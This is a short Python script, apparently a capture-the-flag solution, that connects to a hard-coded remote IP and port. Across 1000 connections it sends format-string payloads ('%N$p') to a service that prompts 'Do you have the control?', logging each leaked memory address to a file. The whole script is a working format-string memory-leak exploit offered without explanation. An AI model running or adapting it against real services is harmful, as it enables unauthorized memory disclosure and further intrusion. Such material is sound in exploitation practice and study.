from pwn import *
from ptrlib import *

def leakAddr(memOffset):
	sock = Socket('34.89.241.255', 30179)
	sock.recvuntil('Do you have the control?')
	sock.sendline('A')
	sock.recvuntil('Do you have the control?')
	sock.sendline('A')
	sock.recvuntil('Do you have the control?\r\n')
	sock.sendline(' | %' + str(memOffset) + '$p | ')
	resp = sock.recvuntil('Do you have the control?')
	sock.close()
	return resp.decode().split(' | ')[3]

for i in range(1000):
	f = open("output.txt", "a")
	f.write(str(i) + " " + leakAddr(i) + "\n")
	f.close
	print(str(i))
